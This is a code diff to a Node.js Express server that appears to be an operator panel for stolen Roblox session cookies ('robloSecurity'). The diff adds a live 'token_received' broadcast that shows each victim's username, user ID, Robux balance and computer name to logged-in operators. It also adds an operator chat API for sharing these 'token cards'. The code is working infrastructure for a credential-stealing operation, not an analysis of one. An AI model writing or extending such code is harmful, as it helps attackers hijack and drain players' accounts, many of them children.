@@ -833,6 +833,20 @@ async function fetchRobuxInfoAsync(robloSecurity, operator, uploaded, db) {
           }}
         );
       }
+      sseClients.forEach(client => {
+        try {
+          client.write(`data: ${JSON.stringify({
+            event: 'token_received',
+            operator: operator,
+            token: {
+              username: rbInfo.username || (uploaded[0] && uploaded[0].roblox?.user) || 'Roblox User',
+              userId: rbInfo.userId,
+              robux: rbInfo.robux || 0,
+              computer: (uploaded[0] && uploaded[0].computer?.name) || 'Unknown'
+            }
+          })}\n\n`);
+        } catch (e) {}
+      });
     }
   } catch (e) {
     console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Асинхронное обновление robuxInfo не удалось: ${e.message}`);
@@ -1207,6 +1221,84 @@ app.get('/tokens', requireAuth, (req, res) => {
       res.json(Array.isArray(emails) ? emails : []);
     } catch (e) {
       res.status(500).json({ error: e.message });
+    }
+  });
+
+  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  //  CHAT API (межоператорский чат + безопасный показ токенов)
+  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  app.get('/api/chat/messages', requireAuth, async (req, res) => {
+    try {
+      const db = await getDb();
+      let messages = [];
+      if (db) {
+        messages = await db.collection('chat_messages').find({}).sort({ createdAt: -1 }).limit(60).toArray();
+        messages.reverse();
+      } else {
+        if (!global.chatMessages) global.chatMessages = [];
+        messages = global.chatMessages.slice(-60);
+      }
+      res.json(messages);
+    } catch (e) {
+      console.error('Chat get error:', e.message);
+      res.status(500).json({ error: 'Failed to load messages' });
+    }
+  });
+
+  app.post('/api/chat/messages', requireAuth, async (req, res) => {
+    const user = req.authUser || req.session.user;
+    const { text, tokenCard } = req.body || {};
+    
+    if ((!text || !text.trim()) && !tokenCard) {
+      return res.status(400).json({ error: 'Empty message' });
+    }
+
+    try {
+      const db = await getDb();
+      const settings = await getOperatorSettings(user);
+      
+      // Исключаем куки и секреты - сохраняем ТОЛЬКО визуальную карточку
+      let safeTokenCard = null;
+      if (tokenCard && typeof tokenCard === 'object') {
+        safeTokenCard = {
+          username: String(tokenCard.username || 'Roblox User').substring(0, 50),
+          userId: tokenCard.userId ? String(tokenCard.userId).substring(0, 30) : null,
+          robux: Number(tokenCard.robux) || 0,
+          computer: String(tokenCard.computer || '—').substring(0, 50)
+        };
+      }
+
+      const newMsg = {
+        id: 'msg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
+        operator: user,
+        displayName: settings.displayName || user,
+        avatarImage: settings.avatarImage || null,
+        avatar: settings.avatar || '',
+        themeColor: settings.themeColor || '#38bdf8',
+        text: typeof text === 'string' ? text.trim().substring(0, 1000) : '',
+        tokenCard: safeTokenCard,
+        createdAt: Date.now()
+      };
+
+      if (db) {
+        await db.collection('chat_messages').insertOne(newMsg);
+      } else {
+        if (!global.chatMessages) global.chatMessages = [];
+        global.chatMessages.push(newMsg);
+        if (global.chatMessages.length > 300) global.chatMessages.shift();
+      }
+
+      // Оповещаем клиентов в реальном времени через SSE
+      sseClients.forEach(client => {
+        try {
+          client.write(`data: ${JSON.stringify({ event: 'chat_message', message: newMsg })}\n\n`);
+        } catch (e) {}
+      });
+
+      res.json({ success: true, message: newMsg });
+    } catch (e) {
+      console.error('Chat post error:', e.message);
+      res.status(500).json({ error: 'Failed to send message' });
     }
   });
 
